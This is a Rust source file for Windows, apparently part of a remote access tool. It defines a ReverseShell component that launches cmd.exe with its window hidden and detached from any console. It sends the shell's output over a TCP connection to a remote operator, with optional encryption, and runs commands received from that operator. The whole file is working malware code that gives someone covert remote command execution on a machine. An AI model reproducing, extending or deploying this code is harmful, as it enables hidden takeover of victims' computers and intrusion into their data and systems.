use std::io::Write;
use std::os::windows::process::CommandExt;
use std::process::Child;
use std::net::TcpStream;
use std::sync::{ Arc, Mutex };

use common::buffers::{ read_console_buffer, write_buffer };
use common::commands::Command;

pub struct ReverseShell {
    pub reverse_shell: Option<Child>,
}

impl ReverseShell {
    pub fn new() -> Self {
        ReverseShell {
            reverse_shell: None,
        }
    }

    pub fn start_shell(&mut self, write_stream: Arc<Mutex<TcpStream>>, secret: &Option<Vec<u8>>) {
        const DETACH: u32 = 0x00000008;
        const HIDE: u32 = 0x08000000;

        self.reverse_shell = Some(
            std::process::Command
                ::new("cmd")
                .creation_flags(HIDE | DETACH)
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
                .unwrap()
        );

        let secret = secret.clone();

        if let Some(shell) = self.reverse_shell.as_mut() {
            if let Some(stdout) = shell.stdout.take() {
                std::thread::spawn(move || {
                    let mut cmd_output = stdout;
                    let mut cmd_buffer: String = String::new();
                    loop {
                        let read_result = read_console_buffer(&mut cmd_output);
                        match read_result {
                            Ok(vec) => {
                                cmd_buffer += &String::from_utf8_lossy(&vec);

                                if String::from_utf8_lossy(&vec).ends_with('>') {
                                    let mut ws_lock = write_stream.lock().unwrap();
                                    write_buffer(
                                        &mut ws_lock,
                                        Command::ShellOutput(cmd_buffer.to_string()),
                                        &secret
                                    );
                                    cmd_buffer.clear();
                                }
                            }
                            Err(_) => {
                                eprintln!("Error reading from shell stdout or end of file.");
                                break;
                            }
                        }
                    }
                });
            }
        }
    }

    pub fn exit_shell(&mut self) {
        if let Some(shell) = self.reverse_shell.as_mut() {
            if let Some(stdin) = shell.stdin.as_mut() {
                let _ = stdin.write_all(b"exit\n");
                let _ = stdin.flush();
            }
        }
    }

    pub fn execute_shell_command(&mut self, command: &str) {
        if let Some(shell) = self.reverse_shell.as_mut() {
            if let Some(stdin) = shell.stdin.as_mut() {
                let _ = stdin.write_all(format!("{}\n", command).as_bytes());
                let _ = stdin.flush();
            }
        }
    }
}
